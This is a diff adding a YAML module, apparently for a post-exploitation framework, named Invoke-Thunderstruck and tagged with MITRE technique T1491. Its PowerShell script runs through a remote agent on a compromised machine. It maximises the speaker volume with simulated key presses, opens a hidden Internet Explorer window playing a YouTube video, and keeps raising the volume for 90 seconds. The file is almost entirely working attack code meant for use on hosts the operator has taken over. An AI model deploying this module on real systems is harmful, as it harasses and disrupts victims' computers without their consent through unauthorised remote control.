@@ -1,0 +1,55 @@
+name: Invoke-Thunderstruck
+authors:
+  - '@obscuresec'
+description: Play's a hidden version of AC/DC's Thunderstruck video while maxing out
+  a computer's volume.
+software: ''
+techniques:
+  - T1491
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: VideoURL
+    description: Other YouTube video URL to play instead of Thunderstruck.
+    required: false
+    value: ''
+script: |
+  Function Invoke-Thunderstruck
+  {
+      [CmdletBinding()]
+      Param (
+          [Parameter(Mandatory = $False, Position = 0)]
+          [ValidateNotNullOrEmpty()]
+          [String] $VideoURL = "https://www.youtube.com/watch?v=1JGkJ6bezDQ"
+      )
+
+      Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
+      Set-Speaker -Volume 50
+
+      #Create hidden IE Com Object
+      $IEComObject = New-Object -com "InternetExplorer.Application"
+      $IEComObject.visible = $False
+      $IEComObject.navigate($VideoURL)
+
+      Start-Sleep -s 5
+
+      $EndTime = (Get-Date).addseconds(90)
+
+      # ghetto way to do this but it basically presses volume up to raise volume in a loop for 90 seconds
+      do {
+         $WscriptObject = New-Object -com wscript.shell
+         $WscriptObject.SendKeys([char]175)
+      }
+      until ((Get-Date) -gt $EndTime)
+  }
+script_end: Invoke-Thunderstruck {{ PARAMS }}
